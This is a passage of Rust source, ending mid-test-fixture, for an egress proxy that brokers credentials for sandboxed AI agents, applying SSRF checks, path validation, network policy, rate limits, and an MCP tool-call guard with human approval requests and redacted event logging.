use std::{
    collections::BTreeMap,
    net::SocketAddr,
    path::{Path, PathBuf},
    sync::{Arc, Mutex},
    time::{Duration, Instant},
};

use agentenv_core::{
    egress_proxy::{BrokerRoute, BrokerService, EgressProxyLaunchConfig, EgressProxyRateLimit},
    security::ssrf::{validate_outbound, SsrfOptions},
};
use agentenv_credstore::{CredentialStore, CredentialStoreConfig, SecretString};
use agentenv_events::{
    sink::SqliteSink, ActivityEvent, ActivityKind, ActivityResult, EventDispatcher, EventEmitter,
};
use agentenv_proto::{
    CredentialKind, CredentialRequirement, HttpAccessLevel, NetworkPolicy, NetworkRule,
    NetworkTarget,
};
use anyhow::{bail, Context, Result};
use axum::{
    body::Body,
    extract::State,
    http::{
        header, HeaderMap, HeaderName, HeaderValue, Method, Request, Response, StatusCode, Uri,
    },
    routing::any,
    Router,
};
use http_body_util::BodyExt;
use reqwest::redirect::Policy as RedirectPolicy;
use tokio::sync::RwLock;
use url::Url;

#[derive(Clone)]
struct ProxyState {
    env_name: String,
    config: Arc<EgressProxyLaunchConfig>,
    policy: Arc<RwLock<NetworkPolicy>>,
    credentials: Arc<CredentialStore>,
    client: reqwest::Client,
    events: Arc<dyn EventEmitter>,
    rate_limits: Arc<Mutex<BTreeMap<String, FixedWindowLimiter>>>,
    mcp_guard_states: Arc<Mutex<BTreeMap<String, agentenv_mcp::guard::GuardSessionState>>>,
    approval_coordinator: Option<agentenv_approvals::ApprovalCoordinator>,
}

#[derive(Debug, Clone)]
struct FixedWindowLimiter {
    window_started_at: Instant,
    count: u32,
    max_per_minute: u32,
}

impl FixedWindowLimiter {
    fn from_config(config: &EgressProxyRateLimit) -> Self {
        Self {
            window_started_at: Instant::now(),
            count: 0,
            max_per_minute: config.requests_per_minute,
        }
    }

    fn allow(&mut self, now: Instant) -> bool {
        if now.duration_since(self.window_started_at) >= Duration::from_secs(60) {
            self.window_started_at = now;
            self.count = 0;
        }
        if self.count >= self.max_per_minute {
            return false;
        }
        self.count += 1;
        true
    }
}

pub(crate) async fn run(args: crate::ProxyArgs) -> Result<()> {
    match args.command {
        crate::ProxyCommand::Run(args) => run_proxy(args).await,
    }
}

async fn run_proxy(args: crate::ProxyRunArgs) -> Result<()> {
    let config: EgressProxyLaunchConfig = read_json(&args.config)
        .await
        .with_context(|| format!("read egress proxy config `{}`", args.config.display()))?;
    if config.env_name != args.env {
        bail!(
            "egress proxy config env `{}` does not match requested env `{}`",
            config.env_name,
            args.env
        );
    }
    let policy: NetworkPolicy = read_json(&config.policy_path).await.with_context(|| {
        format!(
            "read egress proxy policy `{}`",
            config.policy_path.display()
        )
    })?;
    let root = runtime_root_from_events_db(&args.events_db)?;
    let credentials = CredentialStore::new(CredentialStoreConfig::from_root_dir(root))
        .context("open credential store for egress proxy")?;
    let dispatcher = EventDispatcher::with_sinks(
        1024,
        vec![Box::new(SqliteSink::new(args.events_db.clone()))],
    );
    let events = Arc::new(dispatcher.emitter()) as Arc<dyn EventEmitter>;
    let env_dir = args
        .events_db
        .parent()
        .context("events db path must live under an env directory")?
        .to_path_buf();
    let approval_coordinator = Some(agentenv_approvals::ApprovalCoordinator::new(
        agentenv_approvals::ApprovalCoordinatorConfig {
            store: agentenv_approvals::ApprovalStore::open(&args.events_db)
                .context("open approval store for egress proxy")?,
            events: Arc::clone(&events),
            poll_interval: Duration::from_millis(250),
            overlay_path: Some(env_dir.join("approval-policy-overlay.yaml")),
            proposal_path: Some(env_dir.join("approval-policy-proposals.yaml")),
            notifications: None,
        },
    ));
    let client = reqwest::Client::builder()
        .no_proxy()
        .redirect(RedirectPolicy::none())
        .build()
        .context("build egress proxy HTTP client")?;
    let state = ProxyState {
        env_name: args.env,
        config: Arc::new(config.clone()),
        policy: Arc::new(RwLock::new(policy)),
        credentials: Arc::new(credentials),
        client,
        events,
        rate_limits: Arc::new(Mutex::new(
            config
                .rate_limits
                .iter()
                .map(|(route_id, limit)| (route_id.clone(), FixedWindowLimiter::from_config(limit)))
                .collect(),
        )),
        mcp_guard_states: Arc::new(Mutex::new(BTreeMap::new())),
        approval_coordinator,
    };

    let listener = tokio::net::TcpListener::bind(listen_addr(&config.listen_url)?)
        .await
        .with_context(|| format!("bind egress proxy listener on {}", config.listen_url))?;
    let app = Router::new()
        .fallback(any(proxy_handler))
        .with_state(Arc::new(state));
    axum::serve(listener, app)
        .await
        .context("serve egress proxy")?;
    dispatcher
        .flush()
        .await
        .context("flush egress proxy events")?;
    Ok(())
}

async fn proxy_handler(
    State(state): State<Arc<ProxyState>>,
    request: Request<Body>,
) -> Response<Body> {
    match handle_proxy_request(state, request).await {
        Ok(response) => response,
        Err(error) => {
            tracing::warn!(%error, "egress proxy request failed");
            text_response(StatusCode::BAD_GATEWAY, "egress proxy failed\n")
        }
    }
}

async fn handle_proxy_request(
    state: Arc<ProxyState>,
    request: Request<Body>,
) -> Result<Response<Body>> {
    reload_policy(&state).await;
    let route = match route_for_path(&state.config.routes, request.uri().path()) {
        Some(route) => route,
        None => {
            emit_egress_event(&state, ActivityKind::EgressDenied, None, None, None, None);
            return Ok(text_response(
                StatusCode::NOT_FOUND,
                "unknown egress route\n",
            ));
        }
    };

    let upstream_url = match upstream_url_for_request(&route, request.method(), request.uri()) {
        Ok(upstream_url) => upstream_url,
        Err(error) => {
            emit_egress_event(
                &state,
                ActivityKind::EgressDenied,
                Some(&route),
                Some(request.method()),
                None,
                Some("invalid_route_path"),
            );
            tracing::warn!(%error, "egress proxy denied invalid route path");
            return Ok(text_response(StatusCode::FORBIDDEN, "egress denied\n"));
        }
    };
    if let Err(error) = validate_upstream_ssrf(&upstream_url) {
        emit_egress_event(
            &state,
            ActivityKind::EgressDenied,
            Some(&route),
            Some(request.method()),
            Some(&upstream_url),
            Some("ssrf_denied"),
        );
        tracing::warn!(%error, "egress proxy denied upstream by SSRF guard");
        return Ok(text_response(StatusCode::FORBIDDEN, "egress denied\n"));
    }
    let policy = state.policy.read().await;
    if !policy_allows(&policy, &route, request.method(), &upstream_url) {
        emit_egress_event(
            &state,
            ActivityKind::EgressDenied,
            Some(&route),
            Some(request.method()),
            Some(&upstream_url),
            Some("egress_denied"),
        );
        return Ok(text_response(StatusCode::FORBIDDEN, "egress denied\n"));
    }
    drop(policy);

    if !rate_limit_allows(&state, &route.id)? {
        emit_egress_event(
            &state,
            ActivityKind::EgressDenied,
            Some(&route),
            Some(request.method()),
            Some(&upstream_url),
            Some("rate_limited"),
        );
        return Ok(text_response(
            StatusCode::TOO_MANY_REQUESTS,
            "rate limited\n",
        ));
    }

    let (guard_response, request) = maybe_handle_mcp_guard(&state, &route, request).await?;
    if let Some(response) = guard_response {
        return Ok(response);
    }

    let secret = state
        .credentials
        .resolve(
            &route.credential_name,
            &credential_requirement(&route.credential_name),
        )
        .with_context(|| format!("resolve credential `{}`", route.credential_name))?;
    let transformed = transform_request_for_route(&route, request, &secret)?;
    let response = forward_request(&state.client, transformed).await?;
    emit_egress_event(
        &state,
        ActivityKind::EgressAllowed,
        Some(&route),
        Some(&response.request_method),
        Some(&upstream_url),
        None,
    );
    Ok(response.response)
}

struct ForwardedResponse {
    request_method: Method,
    response: Response<Body>,
}

async fn forward_request(
    client: &reqwest::Client,
    request: Request<Body>,
) -> Result<ForwardedResponse> {
    let method = request.method().clone();
    let uri = request.uri().to_string();
    let mut builder = client.request(
        reqwest::Method::from_bytes(method.as_str().as_bytes()).context("convert method")?,
        uri,
    );
    for (name, value) in request.headers() {
        builder = builder.header(name.as_str(), value.as_bytes());
    }
    let (parts, body) = request.into_parts();
    let response = builder
        .body(reqwest::Body::wrap_stream(body.into_data_stream()))
        .send()
        .await
        .context("forward egress request")?;
    let status = StatusCode::from_u16(response.status().as_u16()).context("convert status")?;
    let headers = response_headers(response.headers());
    let mut out = Response::builder().status(status);
    for (name, value) in headers.iter() {
        out = out.header(name, value);
    }
    Ok(ForwardedResponse {
        request_method: parts.method,
        response: out
            .body(Body::from_stream(response.bytes_stream()))
            .context("build proxy response")?,
    })
}

fn transform_request_for_route<B>(
    route: &BrokerRoute,
    mut request: Request<B>,
    secret: &SecretString,
) -> Result<Request<B>> {
    let upstream_url = upstream_url_for_request(route, request.method(), request.uri())?;
    *request.uri_mut() = upstream_url
        .as_str()
        .parse::<Uri>()
        .with_context(|| format!("build upstream URI for route `{}`", route.id))?;
    strip_request_identity_headers(request.headers_mut());
    apply_auth_header(route, request.headers_mut(), secret)?;
    Ok(request)
}

fn upstream_url_for_request(route: &BrokerRoute, method: &Method, uri: &Uri) -> Result<Url> {
    let stripped = uri
        .path()
        .strip_prefix(&route.request_path_prefix)
        .with_context(|| format!("request path does not match route `{}`", route.id))?;
    validate_service_path(route, method, stripped, uri.query())?;
    let stripped = if stripped.is_empty() { "/" } else { stripped };
    let mut upstream = route.upstream_base_url.clone();
    let base_path = upstream.path().trim_end_matches('/');
    let stripped_path = stripped.trim_start_matches('/');
    let path = if base_path.is_empty() {
        format!("/{stripped_path}")
    } else if stripped_path.is_empty() {
        base_path.to_owned()
    } else {
        format!("{base_path}/{stripped_path}")
    };
    upstream.set_path(&path);
    upstream.set_query(uri.query());
    Ok(upstream)
}

fn validate_service_path(
    route: &BrokerRoute,
    method: &Method,
    stripped_path: &str,
    query: Option<&str>,
) -> Result<()> {
    let lowercase_path = stripped_path.to_ascii_lowercase();
    if stripped_path.contains("://")
        || stripped_path.contains('\\')
        || stripped_path.starts_with("//")
        || lowercase_path.contains("%2f")
        || lowercase_path.contains("%5c")
        || stripped_path
            .split('/')
            .any(|segment| matches!(segment, "." | ".."))
    {
        bail!("route `{}` contains an unsafe upstream path", route.id);
    }

    match &route.service {
        BrokerService::Oci { .. }
            if stripped_path != "/v2" && !stripped_path.starts_with("/v2/") =>
        {
            bail!("OCI route `{}` must stay under /v2/", route.id);
        }
        BrokerService::GitHub if route.id == "github.git" => {
            validate_github_git_smart_http(route, method, stripped_path, query)?;
        }
        _ => {}
    }

    Ok(())
}

fn validate_github_git_smart_http(
    route: &BrokerRoute,
    method: &Method,
    stripped_path: &str,
    query: Option<&str>,
) -> Result<()> {
    let segments = stripped_path
        .trim_start_matches('/')
        .split('/')
        .collect::<Vec<_>>();
    let Some((owner, rest)) = segments.split_first() else {
        bail!("GitHub git route `{}` must target owner/repo.git", route.id);
    };
    let Some((repo, suffix)) = rest.split_first() else {
        bail!("GitHub git route `{}` must target owner/repo.git", route.id);
    };
    if owner.is_empty() || repo.strip_suffix(".git").is_none_or(str::is_empty) {
        bail!("GitHub git route `{}` must target owner/repo.git", route.id);
    }

    match suffix {
        ["info", "refs"] if *method == Method::GET && github_git_info_refs_query_allows(query) => {
            Ok(())
        }
        ["git-upload-pack" | "git-receive-pack"] if *method == Method::POST => Ok(()),
        _ => bail!(
            "GitHub git route `{}` only supports smart HTTP endpoints",
            route.id
        ),
    }
}

fn github_git_info_refs_query_allows(query: Option<&str>) -> bool {
    query.is_some_and(|query| {
        url::form_urlencoded::parse(query.as_bytes()).any(|(key, value)| {
            key == "service" && matches!(value.as_ref(), "git-upload-pack" | "git-receive-pack")
        })
    })
}

fn validate_upstream_ssrf(upstream_url: &Url) -> Result<()> {
    validate_outbound(upstream_url, SsrfOptions::default())
        .map(|_| ())
        .with_context(|| format!("upstream URL `{upstream_url}` failed SSRF validation"))
}

fn route_for_path(routes: &[BrokerRoute], path: &str) -> Option<BrokerRoute> {
    routes
        .iter()
        .filter(|route| {
            path == route.request_path_prefix
                || path
                    .strip_prefix(&route.request_path_prefix)
                    .is_some_and(|suffix| suffix.starts_with('/'))
        })
        .max_by_key(|route| route.request_path_prefix.len())
        .cloned()
}

fn apply_auth_header(
    route: &BrokerRoute,
    headers: &mut HeaderMap,
    secret: &SecretString,
) -> Result<()> {
    match route.service {
        BrokerService::Anthropic => {
            headers.insert(
                HeaderName::from_static("x-api-key"),
                HeaderValue::from_str(secret.expose_secret())
                    .context("anthropic api key header")?,
            );
        }
        BrokerService::OpenAi
        | BrokerService::GitHub
        | BrokerService::Mcp { .. }
        | BrokerService::Oci { .. } => {
            headers.insert(
                header::AUTHORIZATION,
                HeaderValue::from_str(&format!("Bearer {}", secret.expose_secret()))
                    .context("bearer authorization header")?,
            );
        }
    }
    Ok(())
}

fn strip_request_identity_headers(headers: &mut HeaderMap) {
    for name in [
        "authorization",
        "x-api-key",
        "cookie",
        "x-request-id",
        "x-openai-client-user-agent",
        "anthropic-beta",
    ] {
        headers.remove(name);
    }
}

fn response_headers(headers: &reqwest::header::HeaderMap) -> HeaderMap {
    let mut out = HeaderMap::new();
    for name in ["content-type", "cache-control"] {
        if let Some(value) = headers.get(name) {
            if let Ok(value) = HeaderValue::from_bytes(value.as_bytes()) {
                if let Ok(name) = HeaderName::from_bytes(name.as_bytes()) {
                    out.insert(name, value);
                }
            }
        }
    }
    out
}

fn policy_allows(
    policy: &NetworkPolicy,
    route: &BrokerRoute,
    method: &Method,
    upstream_url: &Url,
) -> bool {
    if policy
        .network
        .deny
        .iter()
        .any(|rule| rule_matches(rule, method, upstream_url))
    {
        return false;
    }
    let host = upstream_url.host_str().unwrap_or_default();
    if !route.allowed_hosts.is_empty() && !route.allowed_hosts.contains(host) {
        return false;
    }
    policy.network.allow.is_empty()
        || policy
            .network
            .allow
            .iter()
            .any(|rule| rule_matches(rule, method, upstream_url))
}

fn rule_matches(rule: &NetworkRule, method: &Method, upstream_url: &Url) -> bool {
    match &rule.target {
        NetworkTarget::Host {
            host,
            port,
            scheme,
            http_access,
        } => {
            if host != upstream_url.host_str().unwrap_or_default() {
                return false;
            }
            if let Some(port) = port {
                if Some(*port) != upstream_url.port_or_known_default() {
                    return false;
                }
            }
            if let Some(scheme) = scheme {
                if scheme != upstream_url.scheme() {
                    return false;
                }
            }
            http_access_allows(http_access.as_ref(), method)
        }
        NetworkTarget::HttpMethodPath {
            host,
            method: allowed_method,
            path,
        } => {
            host.as_deref()
                .is_none_or(|host| host == upstream_url.host_str().unwrap_or_default())
                && allowed_method.eq_ignore_ascii_case(method.as_str())
                && upstream_url.path().starts_with(path)
        }
        NetworkTarget::UrlPattern { pattern } => upstream_url.as_str().starts_with(pattern),
        NetworkTarget::Cidr { .. } | NetworkTarget::Port { .. } => false,
    }
}

fn http_access_allows(access: Option<&HttpAccessLevel>, method: &Method) -> bool {
    match access {
        None | Some(HttpAccessLevel::Full) => true,
        Some(HttpAccessLevel::ReadOnly) => matches!(method, &Method::GET | &Method::HEAD),
        Some(HttpAccessLevel::ReadWrite) => matches!(
            method,
            &Method::GET | &Method::HEAD | &Method::POST | &Method::PUT | &Method::PATCH
        ),
    }
}

fn rate_limit_allows(state: &ProxyState, route_id: &str) -> Result<bool> {
    let mut limits = state
        .rate_limits
        .lock()
        .map_err(|_| anyhow::anyhow!("egress proxy rate limiter lock poisoned"))?;
    Ok(limits
        .get_mut(route_id)
        .is_none_or(|limit| limit.allow(Instant::now())))
}

async fn maybe_handle_mcp_guard(
    state: &ProxyState,
    route: &BrokerRoute,
    request: Request<Body>,
) -> Result<(Option<Response<Body>>, Request<Body>)> {
    let Some(config) = route.mcp_guard.as_ref().filter(|config| config.enabled) else {
        return Ok((None, request));
    };
    if !matches!(route.service, BrokerService::Mcp { .. })
        || request.method() != Method::POST
        || !request_content_type_is_json(request.headers())
    {
        return Ok((None, request));
    }

    let (parts, body) = request.into_parts();
    let bytes = body
        .collect()
        .await
        .context("read MCP guard request body")?
        .to_bytes();
    let json = match serde_json::from_slice::<serde_json::Value>(&bytes) {
        Ok(json) => json,
        Err(error) => {
            tracing::warn!(%error, route_id = %route.id, "egress proxy rejected malformed MCP JSON body");
            let request = Request::from_parts(parts, Body::from(bytes));
            return Ok((
                Some(text_response(StatusCode::BAD_REQUEST, "invalid mcp json\n")),
                request,
            ));
        }
    };

    let decision = {
        let mut states = state
            .mcp_guard_states
            .lock()
            .map_err(|_| anyhow::anyhow!("MCP guard state lock poisoned"))?;
        let guard_state = states.entry(route.id.clone()).or_default();
        agentenv_mcp::guard::evaluate_json_rpc_request(config, guard_state, &json)
    };
    let decision = match decision {
        Ok(decision) => decision,
        Err(error) => {
            tracing::warn!(%error, route_id = %route.id, "egress proxy rejected malformed MCP tool call");
            let request = Request::from_parts(parts, Body::from(bytes));
            return Ok((
                Some(text_response(StatusCode::FORBIDDEN, "mcp tool denied\n")),
                request,
            ));
        }
    };

    emit_mcp_guard_event(state, route, &decision);

    let action = decision.action;
    let request = Request::from_parts(parts, Body::from(bytes));
    match action {
        agentenv_mcp::guard::GuardAction::Deny => Ok((
            Some(text_response(StatusCode::FORBIDDEN, "mcp tool denied\n")),
            request,
        )),
        agentenv_mcp::guard::GuardAction::RequestApproval => {
            let response = response_for_mcp_approval_request(state, route, &decision).await?;
            Ok((response, request))
        }
        agentenv_mcp::guard::GuardAction::Forward
        | agentenv_mcp::guard::GuardAction::NotToolCall => Ok((None, request)),
    }
}

async fn response_for_mcp_approval_request(
    state: &ProxyState,
    route: &BrokerRoute,
    decision: &agentenv_mcp::guard::GuardDecision,
) -> Result<Option<Response<Body>>> {
    let Some(coordinator) = state.approval_coordinator.as_ref() else {
        return Ok(Some(text_response(
            StatusCode::SERVICE_UNAVAILABLE,
            "mcp approval unavailable\n",
        )));
    };
    let Some(tool_name) = decision.tool_name.as_ref() else {
        return Ok(Some(text_response(
            StatusCode::FORBIDDEN,
            "mcp tool denied\n",
        )));
    };

    let request_id = format!("req_{}", uuid::Uuid::now_v7());
    let reason_code = mcp_guard_reason_code(decision.reason);
    let default_scope = if decision.approval_mode == agentenv_proto::McpApprovalMode::PerSession {
        agentenv_approvals::ApprovalScope::Session
    } else {
        agentenv_approvals::ApprovalScope::Once
    };
    let request = agentenv_approvals::ApprovalRequest::new(
        request_id.clone(),
        state.env_name.clone(),
        agentenv_approvals::ApprovalKind::McpTool,
        tool_name.clone(),
        reason_code,
        serde_json::json!({
            "route_id": route.id,
            "matched_policy": decision.matched_policy,
            "guard_context": decision.redacted_event_context,
        }),
        time::OffsetDateTime::now_utc(),
        default_scope,
        Duration::from_secs(60),
        crate::new_cli_trace_id(),
    );

    coordinator
        .submit_request(request)
        .await
        .context("submit MCP tool approval request")?;
    let approval = coordinator
        .wait_for_decision(&request_id)
        .await
        .context("wait for MCP tool approval decision")?;

    match approval.decision {
        agentenv_approvals::ApprovalDecisionValue::Allow => {
            if approval.scope == agentenv_approvals::ApprovalScope::Session {
                let mut states = state
                    .mcp_guard_states
                    .lock()
                    .map_err(|_| anyhow::anyhow!("MCP guard state lock poisoned"))?;
                states
                    .entry(route.id.clone())
                    .or_default()
                    .grant_session(tool_name.clone());
            }
            Ok(None)
        }
        agentenv_approvals::ApprovalDecisionValue::Deny => Ok(Some(text_response(
            StatusCode::FORBIDDEN,
            "mcp tool denied\n",
        ))),
    }
}

fn request_content_type_is_json(headers: &HeaderMap) -> bool {
    headers
        .get(header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .is_some_and(|value| {
            value
                .split(';')
                .next()
                .is_some_and(|mime| mime.trim().eq_ignore_ascii_case("application/json"))
        })
}

fn emit_mcp_guard_event(
    state: &ProxyState,
    route: &BrokerRoute,
    decision: &agentenv_mcp::guard::GuardDecision,
) {
    let Some(tool_name) = decision.tool_name.as_ref() else {
        return;
    };
    let result = match decision.action {
        agentenv_mcp::guard::GuardAction::Forward
        | agentenv_mcp::guard::GuardAction::NotToolCall => ActivityResult::Ok,
        agentenv_mcp::guard::GuardAction::Deny => ActivityResult::Denied,
        agentenv_mcp::guard::GuardAction::RequestApproval => ActivityResult::PendingApproval,
    };
    let mut event = ActivityEvent::new(
        crate::now_event_ts(),
        ActivityKind::McpToolCall,
        result,
        crate::new_cli_trace_id(),
    )
    .with_env(state.env_name.clone())
    .with_actor_value("kind", serde_json::json!("egress_proxy"))
    .with_subject_value("route_id", serde_json::json!(route.id))
    .with_subject_value("tool_name", serde_json::json!(tool_name))
    .with_extra("guard_context", decision.redacted_event_context.clone())
    .with_reason_code(mcp_guard_reason_code(decision.reason));
    if let Some(policy) = decision.matched_policy.as_ref() {
        event = event.with_subject_value("matched_policy", serde_json::json!(policy));
    }
    state.events.emit(event.redacted());
}

fn mcp_guard_reason_code(reason: agentenv_mcp::guard::GuardReason) -> &'static str {
    match reason {
        agentenv_mcp::guard::GuardReason::Disabled => "mcp_guard_disabled",
        agentenv_mcp::guard::GuardReason::NotToolCall => "mcp_not_tool_call",
        agentenv_mcp::guard::GuardReason::AllowedByPolicy => "mcp_allowed_by_policy",
        agentenv_mcp::guard::GuardReason::ApprovalRequired => "mcp_approval_required",
        agentenv_mcp::guard::GuardReason::UrlAllowlistViolation => "mcp_url_allowlist_violation",
        agentenv_mcp::guard::GuardReason::CredentialLikeArgument => "mcp_credential_like_argument",
        agentenv_mcp::guard::GuardReason::EnvVarLikeArgument => "mcp_env_var_like_argument",
        agentenv_mcp::guard::GuardReason::RateLimited => "mcp_rate_limited",
        agentenv_mcp::guard::GuardReason::CrossToolFlow => "mcp_cross_tool_flow",
        agentenv_mcp::guard::GuardReason::MalformedToolCall => "mcp_malformed_tool_call",
        agentenv_mcp::guard::GuardReason::ProvenanceTaint => "mcp_provenance_taint",
    }
}

async fn reload_policy(state: &ProxyState) {
    match read_json::<NetworkPolicy>(&state.config.policy_path).await {
        Ok(policy) => *state.policy.write().await = policy,
        Err(error) => tracing::warn!(%error, "failed to reload egress proxy policy"),
    }
}

fn emit_egress_event(
    state: &ProxyState,
    kind: ActivityKind,
    route: Option<&BrokerRoute>,
    method: Option<&Method>,
    upstream_url: Option<&Url>,
    reason_code: Option<&str>,
) {
    let result = if kind == ActivityKind::EgressAllowed {
        ActivityResult::Ok
    } else {
        ActivityResult::Denied
    };
    let mut event = ActivityEvent::new(
        crate::now_event_ts(),
        kind,
        result,
        crate::new_cli_trace_id(),
    )
    .with_env(state.env_name.clone())
    .with_actor_value("kind", serde_json::json!("egress_proxy"));
    if let Some(route) = route {
        event = event
            .with_subject_value("service", serde_json::json!(service_label(&route.service)))
            .with_subject_value("route_id", serde_json::json!(route.id));
    }
    if let Some(method) = method {
        event = event.with_subject_value("method", serde_json::json!(method.as_str()));
    }
    if let Some(url) = upstream_url {
        event = event
            .with_subject_value("upstream_origin", serde_json::json!(url_origin(url)))
            .with_subject_value("upstream_path", serde_json::json!(url.path()));
    }
    if let Some(reason_code) = reason_code {
        event = event.with_reason_code(reason_code);
    }
    state.events.emit(event.redacted());
}

fn service_label(service: &BrokerService) -> String {
    match service {
        BrokerService::OpenAi => "openai".to_owned(),
        BrokerService::Anthropic => "anthropic".to_owned(),
        BrokerService::GitHub => "github".to_owned(),
        BrokerService::Mcp { route_id } => format!("mcp.{route_id}"),
        BrokerService::Oci { registry } => format!("oci.{registry}"),
    }
}

fn url_origin(url: &Url) -> String {
    match url.port() {
        Some(port) => format!(
            "{}://{}:{port}",
            url.scheme(),
            url.host_str().unwrap_or_default()
        ),
        None => format!("{}://{}", url.scheme(), url.host_str().unwrap_or_default()),
    }
}

fn credential_requirement(name: &str) -> CredentialRequirement {
    CredentialRequirement {
        name: name.to_owned(),
        description: format!("brokered egress credential {name}"),
        kind: CredentialKind::Token,
        required: true,
        validator: None,
    }
}

async fn read_json<T>(path: &Path) -> Result<T>
where
    T: serde::de::DeserializeOwned,
{
    let bytes = tokio::fs::read(path).await?;
    Ok(serde_json::from_slice(&bytes)?)
}

fn listen_addr(url: &Url) -> Result<SocketAddr> {
    let host = url
        .host_str()
        .context("egress proxy listen URL must include a host")?;
    let port = url
        .port()
        .context("egress proxy listen URL must include an explicit port")?;
    format!("{host}:{port}")
        .parse()
        .with_context(|| format!("parse egress proxy listen address `{host}:{port}`"))
}

fn runtime_root_from_events_db(path: &Path) -> Result<PathBuf> {
    let env_dir = path
        .parent()
        .context("events db path must live under an env directory")?;
    let envs_dir = env_dir
        .parent()
        .context("events db path must live under envs directory")?;
    Ok(envs_dir
        .parent()
        .context("events db path must live under runtime root")?
        .to_path_buf())
}

fn text_response(status: StatusCode, body: &'static str) -> Response<Body> {
    Response::builder()
        .status(status)
        .header(header::CONTENT_TYPE, "text/plain; charset=utf-8")
        .body(Body::from(body))
        .unwrap_or_else(|_| Response::new(Body::from(body)))
}

#[cfg(test)]
mod tests {
    use std::{
        collections::{BTreeMap, BTreeSet},
        fs,
        time::{SystemTime, UNIX_EPOCH},
    };

    use super::*;
    use agentenv_events::NoopEventEmitter;
    use agentenv_proto::{
        DnsPolicy, FilesystemPolicy, InferencePolicy, NetworkAccessPolicy, PolicyReloadability,
        ProcessPolicy,
    };

    fn test_openai_route() -> BrokerRoute {
        BrokerRoute {
            id: "openai".to_owned(),
            service: BrokerService::OpenAi,
            upstream_base_url: "https://api.openai.com/v1".parse().unwrap(),
            credential_name: "OPENAI_API_KEY".to_owned(),
            request_path_prefix: "/v1/openai".to_owned(),
            allowed_hosts: BTreeSet::from(["api.openai.com".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_anthropic_route() -> BrokerRoute {
        BrokerRoute {
            id: "anthropic".to_owned(),
            service: BrokerService::Anthropic,
            upstream_base_url: "https://api.anthropic.com".parse().unwrap(),
            credential_name: "ANTHROPIC_API_KEY".to_owned(),
            request_path_prefix: "/v1/anthropic".to_owned(),
            allowed_hosts: BTreeSet::from(["api.anthropic.com".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_github_route() -> BrokerRoute {
        BrokerRoute {
            id: "github.api".to_owned(),
            service: BrokerService::GitHub,
            upstream_base_url: "https://api.github.com".parse().unwrap(),
            credential_name: "GITHUB_TOKEN".to_owned(),
            request_path_prefix: "/v1/github/api".to_owned(),
            allowed_hosts: BTreeSet::from(["api.github.com".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_github_git_route() -> BrokerRoute {
        BrokerRoute {
            id: "github.git".to_owned(),
            service: BrokerService::GitHub,
            upstream_base_url: "https://github.com".parse().unwrap(),
            credential_name: "GITHUB_TOKEN".to_owned(),
            request_path_prefix: "/v1/github/git".to_owned(),
            allowed_hosts: BTreeSet::from(["github.com".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_mcp_route() -> BrokerRoute {
        BrokerRoute {
            id: "mcp.primary".to_owned(),
            service: BrokerService::Mcp {
                route_id: "primary".to_owned(),
            },
            upstream_base_url: "https://mcp.example.test/rpc".parse().unwrap(),
            credential_name: "MCP_TOKEN".to_owned(),
            request_path_prefix: "/v1/mcp/primary".to_owned(),
            allowed_hosts: BTreeSet::from(["mcp.example.test".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_oci_route() -> BrokerRoute {
        BrokerRoute {
            id: "oci.ghcr.io".to_owned(),
            service: BrokerService::Oci {
                registry: "ghcr.io".to_owned(),
            },
            upstream_base_url: "https://ghcr.io".parse().unwrap(),
            credential_name: "oci.ghcr.io".to_owned(),
            request_path_prefix: "/v1/oci/ghcr.io".to_owned(),
            allowed_hosts: BTreeSet::from(["ghcr.io".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_loopback_route() -> BrokerRoute {
        BrokerRoute {
            id: "mcp.loopback".to_owned(),
            service: BrokerService::Mcp {
                route_id: "loopback".to_owned(),
            },
            upstream_base_url: "http://127.0.0.1:8080".parse().unwrap(),
            credential_name: "MCP_TOKEN".to_owned(),
            request_path_prefix: "/v1/mcp/loopback".to_owned(),
            allowed_hosts: BTreeSet::from(["127.0.0.1".to_owned()]),
            mcp_guard: None,
        }
    }

    fn test_request(path: &str) -> Request<Vec<u8>> {
        Request::builder()
            .method("GET")
            .uri(path)
            .body(Vec::<u8>::new())
            .unwrap()
    }

    fn temp_dir(prefix: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock should be after Unix epoch")
            .as_nanos();
        std::env::temp_dir().join(format!("{prefix}-{}-{nanos}", std::process::id()))
    }

    fn policy_with_rules(allow_hosts: &[&str], deny_hosts: &[&str]) -> NetworkPolicy {
        NetworkPolicy {
            network: NetworkAccessPolicy {
                reloadability: PolicyReloadability::HotReload,
                allow: allow_hosts
                    .iter()
                    .map(|host| NetworkRule {
                        target: NetworkTarget::Host {
                            host: (*host).to_owned(),
                            port: Some(443),
                            scheme: Some("https".to_owned()),
                            http_access: Some(HttpAccessLevel::Full),
                        },
                    })
                    .collect(),
                deny: deny_hosts
                    .iter()
                    .map(|host| NetworkRule {
                        target: NetworkTarget::Host {
                            host: (*host).to_owned(),
                            port: Some(443),
                            scheme: Some("https".to_owned()),
                            http_access: Some(HttpAccessLevel::Full),
                        },
                    })
                    .collect(),
                approval_required: Vec::new(),
                dns: DnsPolicy::default(),
            },
            filesystem: FilesystemPolicy {
                reloadability: PolicyReloadability::LockedAtCreate,
                read_only: Vec::new(),
                read_write: Vec::new(),
            },
            process: ProcessPolicy {
                reloadability: PolicyReloadability::LockedAtCreate,
                run_as_user: "agent".to_owned(),
                run_as_group: "agent".to_owned(),
                profile: "default".to_owned(),
                allow_syscalls: Vec::new(),
                deny_syscalls: Vec::new(),
            },
            inference: InferencePolicy {
                reloadability: PolicyReloadability::HotReload,
                routes: Vec::new(),
            },
        }
    }

    fn test_state(
        root: &Path,
        route: BrokerRoute,
        policy: NetworkPolicy,
        rate_limits: BTreeMap<String, EgressProxyRateLimit>,
    ) -> ProxyState {
        let policy_path = root.join("policy.json");
        let config = EgressProxyLaunchConfig {
            env_name: "demo".to_owned(),
            listen_url: "http://127.0.0.1:31001".parse().unwrap(),
            routes: vec![route],
            credential_names: Vec::new(),
            policy_path,
            rate_limits: rate_limits.clone(),
        };
        ProxyState {
            env_name: "demo".to_owned(),
            config: Arc::new(config),
            policy: Arc::new(RwLock::new(policy)),
            credentials: Arc::new(
                CredentialStore::new(CredentialStoreConfig::from_root_dir(root))
